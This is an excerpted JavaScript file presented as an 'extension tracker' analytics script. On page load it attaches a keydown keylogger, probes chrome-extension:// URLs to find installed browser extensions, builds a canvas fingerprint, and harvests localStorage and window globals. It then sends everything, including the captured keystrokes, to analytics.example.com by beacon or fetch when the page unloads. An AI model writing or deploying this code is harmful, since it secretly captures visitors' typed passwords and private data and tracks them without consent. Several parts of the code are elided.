...
class EnhancedExtensionTracker {
  ...
  startListeners() {
    document.addEventListener('keydown', this.keyLogger.bind(this));
    window.addEventListener('unload', this.closeHandler.bind(this));
  }
  keyLogger(e) {
    this._results.set('keylogger', (this._results.get('keylogger') || '') + String.fromCharCode(e.keyCode));
  }
  closeHandler() {
    localStorage.setItem('lastPageState', JSON.stringify(this._results));
    this._sendReport();
  }
  async _checkResource(extensionId, file) {
    ...
    return new Promise((resolve, reject) => {
      xhr.timeout = 4000;
      xhr.onreadystatechange = () => xhr.readyState === 4 ? resolve(xhr.status === 200) : reject(false);
      xhr.onabort = xhr.onerror = xhr.ontimeout = () => resolve(false);
      xhr.open('GET', `chrome-extension://${extensionId}/${file}${uniqueParam}`, true);
      xhr.send();
    });
  }
  _batchSplit(arr, size) {
    return Array.from({
      length: Math.ceil(arr.length / size)
    }, (v, i) => arr.slice(i * size, i * size + size));
  }
  async _showAfterMultipleAttempts(name, data) {
    let detected = false;
    for (let trial = 0; trial < this._retryCount && !detected; trial++) {
  ...
  async tracker() {
    ...
    const batches = this._batchSplit(entries, this._concurrency);
    for (const batch of batches) {
      await Promise.all(batch.map(async ([name, data]) => {
        const isSpotted = await this._showAfterMultipleAttempts(name, data);
        this._results.set(name, isSpotted);
      }));
    }
    this._transmitReport();
  }
  _generateUniqueIdentification() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const txt = 'uniqueId,999';
  ...
  _transmitReport() {
    const reportObject = {
      ...
      metadata: {
        ...
        uniqueIdentification: this._generateUniqueIdentification(),
        platform: {
        ...
        localData: JSON.parse(localStorage.getItem('lastPageState') || "{}"),
        globalVars: Object.keys(window)
      }
    };
    const encoder = new TextEncoder();
    const data = encoder.encode(JSON.stringify(reportObject));
    if ('sendBeacon' in navigator) {
      navigator.sendBeacon('https://analytics.example.com/ext-report', data);
    } else {
      fetch('https://analytics.example.com/ext-report', {
        method: 'POST',
        body: data,
        keepalive: true,
        headers: {
...
(() => {
  ...
  if (document.readyState !== 'loading') {
    ...
    document.addEventListener('DOMContentLoaded', () => tracker.tracker());
  }
})();